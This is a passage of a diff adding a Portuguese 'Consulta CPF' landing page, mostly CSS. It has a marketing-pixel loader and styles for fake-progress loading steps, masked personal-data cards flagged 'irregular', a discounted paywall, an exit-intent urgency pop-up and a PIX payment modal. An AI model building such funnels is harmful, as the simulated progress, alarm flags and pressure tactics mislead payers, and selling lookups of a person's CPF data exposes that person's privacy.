@@ -1,0 +1,3112 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta CPF - Verificação Rápida e Segura</title>
+    <meta name="description" content="Consulte CPF de forma rápida, segura e confiável. Dados atualizados em segundos.">
+    <!-- UTMify Pixel -->
+    <script>
+        window.pixelId = "691e4e1d6076486a2bdde991";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+            line-height: 1.6;
+        }
+
+        /* Header */
+        .header {
+            background: #0c326f;
+            padding: 16px 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo i {
+            color: #22C55E;
+        }
+
+        .header-badge {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22C55E;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: none;
+        }
+
+        @media (min-width: 640px) {
+            .header-badge {
+                display: block;
+            }
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #0c326f 0%, #1e4a9e 100%);
+            padding: 100px 20px 60px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+        }
+
+        @media (max-width: 640px) {
+            .hero {
+                padding: 80px 15px 40px;
+                min-height: auto;
+            }
+
+            .hero-content {
+                max-width: 100%;
+            }
+
+            .trust-badges {
+                flex-direction: column;
+                gap: 8px;
+            }
+
+            .trust-badge {
+                font-size: 0.8rem;
+            }
+        }
+
+        .hero-content {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .hero h1 {
+            color: white;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        @media (min-width: 640px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+        }
+
+        .hero p {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.1rem;
+            margin-bottom: 32px;
+        }
+
+        /* Form Card */
+        .form-card {
+            background: white;
+            border-radius: 16px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        @media (max-width: 640px) {
+            .form-card {
+                padding: 20px 15px;
+                border-radius: 12px;
+            }
+
+            .form-label {
+                font-size: 0.85rem;
+            }
+
+            .cpf-input {
+                padding: 14px 16px;
+                font-size: 1.1rem;
+            }
+
+            .submit-btn {
+                padding: 14px;
+                font-size: 1rem;
+            }
+        }
+
+        .form-label {
+            display: block;
+            color: #0c326f;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+        }
+
+        .cpf-input {
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 1.25rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-bottom: 16px;
+        }
+
+        .cpf-input:focus {
+            outline: none;
+            border-color: #0c326f;
+            box-shadow: 0 0 0 4px rgba(12, 50, 111, 0.1);
+        }
+
+        .cpf-input.error {
+            border-color: #ef4444;
+        }
+
+        .error-message {
+            color: #ef4444;
+            font-size: 0.875rem;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px 24px;
+            background: #22C55E;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #16a34a;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.4);
+        }
+
+        .submit-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Trust Badges */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 24px;
+            flex-wrap: wrap;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 0.8rem;
+        }
+
+        .trust-badge i {
+            color: #22C55E;
+        }
+
+        /* Loading Section */
+        .loading-section {
+            display: none;
+            margin-top: 24px;
+        }
+
+        .loading-section.show {
+            display: block;
+        }
+
+        .loading-title {
+            color: #0c326f;
+            font-weight: 600;
+            margin-bottom: 16px;
+            font-size: 1rem;
+        }
+
+        .loading-step {
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideIn 0.5s ease forwards;
+        }
+
+        .loading-step i {
+            color: #0c326f;
+            width: 20px;
+        }
+
+        .loading-step .check {
+            color: #22C55E;
+            display: none;
+        }
+
+        .loading-step.completed .check {
+            display: block;
+        }
+
+        .loading-step.completed .spinner {
+            display: none;
+        }
+
+        .progress-bar {
+            height: 3px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            margin-top: 6px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #0c326f;
+            width: 0;
+            animation: progressFill 1.5s ease-in-out forwards;
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes progressFill {
+            to {
+                width: 100%;
+            }
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .fa-spinner {
+            animation: spin 1s linear infinite;
+        }
+
+        /* Result Section */
+
+        /* Partial Result Card Styles */
+        .partial-result-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 20px;
+        }
+
+        @media (max-width: 640px) {
+            .partial-result-card {
+                padding: 15px;
+                border-radius: 10px;
+            }
+
+            .partial-result-header {
+                padding: 12px 15px;
+                margin: -15px -15px 15px -15px;
+                flex-direction: column;
+                text-align: center;
+                gap: 5px;
+            }
+
+            .partial-result-header h3 {
+                font-size: 1rem;
+            }
+        }
+
+        .partial-result-header {
+            background: linear-gradient(90deg, #3b82f6, #22C55E);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: -20px -20px 20px -20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .partial-result-header h3 {
+            color: white;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+        }
+
+        @media (min-width: 640px) {
+            .data-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 640px) {
+            .data-grid {
+                gap: 10px;
+            }
+
+            .data-card {
+                padding: 12px;
+            }
+
+            .data-card-header {
+                font-size: 0.8rem;
+            }
+
+            .data-card-value {
+                font-size: 1rem;
+            }
+
+            .data-card-unlock {
+                font-size: 0.75rem;
+            }
+        }
+
+        .data-card {
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 15px;
+            background: white;
+            /* Garante fundo branco */
+        }
+
+        .data-card-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            color: #0c326f;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .data-card-header i {
+            color: #3b82f6;
+            /* Azul para o cadeado no cabeçalho */
+            font-size: 1.1rem;
+        }
+
+        .data-card-value {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 10px;
+            padding: 10px;
+            background: #f8fafc;
+            /* Fundo cinza claro para o valor mascarado */
+            border-radius: 4px;
+        }
+
+        .data-card-unlock {
+            font-size: 0.8rem;
+            color: #0c326f;
+            /* Azul escuro para o texto de desbloqueio */
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding-top: 5px;
+            border-top: 1px dotted #e2e8f0;
+            /* Linha pontilhada sutil */
+        }
+
+        .data-card-unlock i {
+            color: #22C55E;
+            /* Verde para o ícone de cadeado/check */
+        }
+
+        .data-card-unlock.confirmed {
+            color: #16a34a;
+        }
+
+        /* Irregular Status Style */
+        .data-card.irregular {
+            border-color: #ef4444;
+            /* Borda vermelha */
+        }
+
+        .data-card.irregular .data-card-header i {
+            color: #ef4444;
+            /* Ícone vermelho no cabeçalho */
+        }
+
+        .data-card.irregular .data-card-value {
+            color: #dc2626;
+            /* Texto do valor vermelho */
+        }
+
+        .data-card.irregular .data-card-unlock i {
+            color: #ef4444;
+            /* Ícone de desbloqueio vermelho */
+        }
+
+        /* Payment Appeal Section */
+        .payment-appeal {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 0;
+            text-align: center;
+            margin-top: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            /* Para o gradiente do header */
+        }
+
+        .payment-appeal-header {
+            background: linear-gradient(90deg, #4f46e5 0%, #3b82f6 100%);
+            padding: 10px 20px;
+            color: white;
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .payment-appeal-content {
+            padding: 30px 20px;
+        }
+
+        .payment-appeal-content h3 {
+            color: #1e293b;
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .payment-appeal-content h3 i {
+            color: #4f46e5;
+            font-size: 2rem;
+        }
+
+        .payment-appeal-price {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #4f46e5;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .payment-appeal-price span {
+            font-size: 1rem;
+            color: #94a3b8;
+            text-decoration: line-through;
+            margin-right: 0;
+        }
+
+        .payment-appeal-price .discount-badge {
+            background: linear-gradient(45deg, #f43f5e 0%, #ec4899 100%);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 700;
+            box-shadow: 0 4px 10px rgba(244, 63, 94, 0.4);
+        }
+
+        .payment-appeal-content p {
+            color: #64748b;
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .liberar-btn {
+            width: 80%;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 15px;
+            background: linear-gradient(90deg, #10b981 0%, #22c55e 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(34, 197, 94, 0.4);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .liberar-btn:hover {
+            background: linear-gradient(90deg, #059669 0%, #16a34a 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(34, 197, 94, 0.6);
+        }
+
+        .paywall-badges-container {
+            display: flex;
+            justify-content: space-around;
+            padding: 0 20px 20px;
+            gap: 10px;
+        }
+
+        .paywall-badge {
+            flex: 1;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px 10px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #475569;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .paywall-badge i {
+            font-size: 1.5rem;
+        }
+
+        .paywall-badge .green-icon {
+            color: #22c55e;
+        }
+
+        .paywall-badge .purple-icon {
+            color: #a855f7;
+        }
+
+        .paywall-badge .blue-icon {
+            color: #3b82f6;
+        }
+
+        /* Mobile Responsiveness for Payment Appeal */
+        @media (max-width: 640px) {
+            .payment-appeal {
+                margin-top: 20px;
+                border-radius: 12px;
+            }
+
+            .payment-appeal-header {
+                padding: 8px 15px;
+                font-size: 0.8rem;
+                gap: 5px;
+                flex-wrap: wrap;
+            }
+
+            .payment-appeal-content {
+                padding: 20px 15px;
+            }
+
+            .payment-appeal-content h3 {
+                font-size: 1.3rem;
+                flex-direction: column;
+                gap: 5px;
+            }
+
+            .payment-appeal-content h3 i {
+                font-size: 1.5rem;
+            }
+
+            .payment-appeal-price {
+                font-size: 2rem;
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+
+            .payment-appeal-price span {
+                font-size: 0.9rem;
+            }
+
+            .payment-appeal-price .discount-badge {
+                font-size: 0.85rem;
+                padding: 4px 8px;
+            }
+
+            .payment-appeal-content p {
+                font-size: 0.85rem;
+                margin-bottom: 20px;
+            }
+
+            .liberar-btn {
+                width: 100%;
+                padding: 12px;
+                font-size: 1rem;
+                margin-bottom: 20px;
+            }
+
+            .paywall-badges-container {
+                flex-direction: column;
+                gap: 8px;
+                padding: 0 15px 15px;
+            }
+
+            .paywall-badge {
+                flex-direction: row;
+                padding: 12px 15px;
+                justify-content: flex-start;
+                gap: 12px;
+            }
+
+            .paywall-badge i {
+                font-size: 1.2rem;
+            }
+        }
+
+        .result-section {
+            display: none;
+            margin-top: 24px;
+        }
+
+        .result-section.show {
+            display: block;
+        }
+
+        .result-card {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px solid #22C55E;
+            border-radius: 12px;
+            padding: 24px;
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .result-header i {
+            color: #22C55E;
+            font-size: 1.5rem;
+        }
+
+        .result-header h3 {
+            color: #166534;
+            font-size: 1.1rem;
+        }
+
+        .result-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+
+        .result-item:last-child {
+            border-bottom: none;
+        }
+
+        .result-item i {
+            color: #0c326f;
+            width: 20px;
+            margin-top: 2px;
+        }
+
+        .result-item .label {
+            color: #64748b;
+            font-size: 0.85rem;
+            margin-bottom: 2px;
+        }
+
+        .result-item .value {
+            color: #1e293b;
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .new-search-btn {
+            width: 100%;
+            padding: 14px;
+            background: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .new-search-btn:hover {
+            background: #092555;
+        }
+
+        /* Error Result */
+        .error-result {
+            background: #fef2f2;
+            border: 2px solid #ef4444;
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-result.show {
+            display: block;
+        }
+
+        .error-result i {
+            color: #ef4444;
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+        }
+
+        .error-result h3 {
+            color: #dc2626;
+            margin-bottom: 8px;
+        }
+
+        .error-result p {
+            color: #7f1d1d;
+            font-size: 0.95rem;
+        }
+
+        /* How it Works Section */
+        .how-it-works {
+            padding: 80px 20px;
+            background: white;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .section-title h2 {
+            color: #0c326f;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .section-title p {
+            color: #64748b;
+            font-size: 1.1rem;
+        }
+
+        .steps-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 32px;
+        }
+
+        @media (min-width: 768px) {
+            .steps-container {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .step-card {
+            text-align: center;
+            padding: 32px 24px;
+            background: #f8fafc;
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+
+        .step-number {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #0c326f 0%, #1e4a9e 100%);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin: 0 auto 20px;
+        }
+
+        .step-icon {
+            font-size: 2.5rem;
+            color: #22C55E;
+            margin-bottom: 16px;
+        }
+
+        .step-card h3 {
+            color: #0c326f;
+            font-size: 1.25rem;
+            margin-bottom: 12px;
+        }
+
+        .step-card p {
+            color: #64748b;
+            font-size: 0.95rem;
+        }
+
+        /* Automated Process Block (Middle) */
+        .automated-process-middle {
+            max-width: 800px;
+            margin: 40px auto;
+            /* Adiciona margem superior e inferior */
+            padding: 30px 20px;
+            text-align: center;
+            background: #f0fdf4;
+            /* Fundo verde claro */
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .automated-process-middle-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #166534;
+            /* Verde escuro para o título */
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .automated-process-middle-subtitle {
+            font-size: 1rem;
+            color: #475569;
+            /* Cinza escuro para o subtítulo */
+            font-weight: 400;
+        }
+
+        /* Security Section */
+        .security-section {
+            padding: 60px 20px;
+            background: #f1f5f9;
+        }
+
+        .security-badges {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: white;
+            padding: 16px 24px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .security-badge i {
+            color: #22C55E;
+            font-size: 1.5rem;
+        }
+
+        .security-badge span {
+            color: #0c326f;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        /* Footer */
+        .footer {
+            background: #0c326f;
+            color: white;
+            padding: 48px 20px 24px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            text-align: left;
+            /* Altera para alinhamento à esquerda */
+        }
+
+        .footer-main {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 40px;
+            padding-bottom: 40px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
+        }
+
+        @media (min-width: 768px) {
+            .footer-main {
+                grid-template-columns: repeat(4, 1fr);
+                /* 4 colunas em telas maiores */
+            }
+        }
+
+        .footer-col h3 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        .footer-col p,
+        .footer-col a {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+            line-height: 1.6;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-col a:hover {
+            color: #22C55E;
+        }
+
+        .footer-contact-info a {
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .footer-contact-info a:last-of-type {
+            margin-bottom: 0;
+        }
+
+        .footer-contact-info .contact-label {
+            font-weight: 400;
+            display: inline;
+        }
+
+        .footer-button {
+            background: #22C55E;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .footer-button:hover {
+            background: #16a34a;
+            color: white;
+        }
+
+        .footer-copyright {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            text-align: center;
+            padding-top: 20px;
+        }
+
+        /* What AI Will Discover Section */
+        .what-ai-discovers {
+            padding: 80px 20px;
+            background: white;
+        }
+
+        .ai-section-title {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .ai-section-title h2 {
+            color: #0c326f;
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+
+        .ai-section-title p {
+            color: #64748b;
+            font-size: 1.1rem;
+        }
+
+        .ai-cards-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        @media (min-width: 768px) {
+            .ai-cards-container {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .ai-card {
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 32px 24px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .ai-card:hover {
+            border-color: #0c326f;
+            box-shadow: 0 10px 30px rgba(12, 50, 111, 0.15);
+            transform: translateY(-5px);
+        }
+
+        .ai-card-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .ai-card-icon.blue {
+            color: #3b82f6;
+        }
+
+        .ai-card-icon.green {
+            color: #22C55E;
+        }
+
+        .ai-card-icon.purple {
+            color: #a855f7;
+        }
+
+        .ai-card-icon.orange {
+            color: #f97316;
+        }
+
+        .ai-card-icon.indigo {
+            color: #6366f1;
+        }
+
+        .ai-card-icon.red {
+            color: #ef4444;
+        }
+
+        .ai-card h3 {
+            color: #0c326f;
+            font-size: 1.25rem;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+
+        .ai-card p {
+            color: #64748b;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        /* Utilities */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Exit Intent Pop-up Styles */
+        .exit-intent-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            padding: 15px;
+        }
+
+        .exit-intent-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .exit-intent-modal {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .exit-intent-overlay.show .exit-intent-modal {
+            transform: scale(1);
+        }
+
+        .exit-badge {
+            background: linear-gradient(90deg, #f43f5e 0%, #ec4899 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .exit-intent-modal h3 {
+            color: #dc2626;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .exit-intent-modal h3 i {
+            color: #f59e0b;
+        }
+
+        .exit-subtitle {
+            color: #475569;
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+        }
+
+        .exit-subtitle strong {
+            color: #4f46e5;
+        }
+
+        .exit-offer-box {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px solid #22c55e;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .exit-offer-price {
+            font-size: 3rem;
+            font-weight: 800;
+            color: #16a34a;
+            margin-bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .exit-offer-price span {
+            font-size: 1.1rem;
+            color: #94a3b8;
+            text-decoration: line-through;
+            margin-right: 0;
+        }
+
+        .exit-discount-badge {
+            background: linear-gradient(45deg, #f43f5e 0%, #ec4899 100%);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 700;
+            display: inline-block;
+            margin-top: 10px;
+            box-shadow: 0 4px 10px rgba(244, 63, 94, 0.4);
+        }
+
+        .exit-urgency {
+            color: #dc2626;
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .exit-offer-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #10b981 0%, #22c55e 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 5px 20px rgba(34, 197, 94, 0.4);
+        }
+
+        .exit-offer-btn:hover {
+            background: linear-gradient(90deg, #059669 0%, #16a34a 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(34, 197, 94, 0.5);
+        }
+
+        .exit-close-btn {
+            background: none;
+            border: none;
+            color: #94a3b8;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .exit-close-btn:hover {
+            color: #64748b;
+        }
+
+        /* Mobile responsiveness for exit intent */
+        @media (max-width: 640px) {
+            .exit-intent-modal {
+                padding: 25px 20px;
+                border-radius: 16px;
+            }
+
+            .exit-badge {
+                font-size: 0.75rem;
+                padding: 6px 15px;
+            }
+
+            .exit-intent-modal h3 {
+                font-size: 1.8rem;
+            }
+
+            .exit-subtitle {
+                font-size: 1rem;
+            }
+
+            .exit-offer-price {
+                font-size: 2.5rem;
+            }
+
+            .exit-offer-btn {
+                padding: 15px;
+                font-size: 1.1rem;
+            }
+        }
+
+        /* Modal de Pagamento PIX Styles */
+        .pix-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            padding: 15px;
+        }
+
+        .pix-modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .pix-modal {
+            background: white;
+            border-radius: 16px;
+            max-width: 450px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+            position: relative;
+        }
+
+        .pix-modal-overlay.show .pix-modal {
+            transform: scale(1);
+        }
+
+        .pix-modal-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #94a3b8;
+            cursor: pointer;
+            z-index: 10;
+            transition: color 0.3s ease;
+        }
+
+        .pix-modal-close:hover {
+            color: #64748b;
+        }
+
+        .pix-modal-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            padding: 25px 25px 20px;
+        }
+
+        .pix-modal-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .pix-modal-icon i {
+            color: white;
+            font-size: 24px;
+        }
+
+        .pix-modal-header h2 {
+            color: #1e293b;
+            font-size: 1.4rem;
+            font-weight: 700;
+            line-height: 1.3;
+            margin: 0;
+        }
+
+        .pix-modal-body {
+            padding: 0 25px 20px;
+        }
+
+        .pix-email-section {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .pix-email-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #1e293b;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .pix-email-label i {
+            color: #3b82f6;
+            font-size: 18px;
+        }
+
+        .pix-email-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #3b82f6;
+            border-radius: 8px;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .pix-email-input:focus {
+            border-color: #2563eb;
+        }
+
+        .pix-relatorio-info {
+            text-align: center;
+            color: #64748b;
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+        }
+
+        .pix-info-box {
+            background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%);
+            border-radius: 12px;
+            padding: 15px;
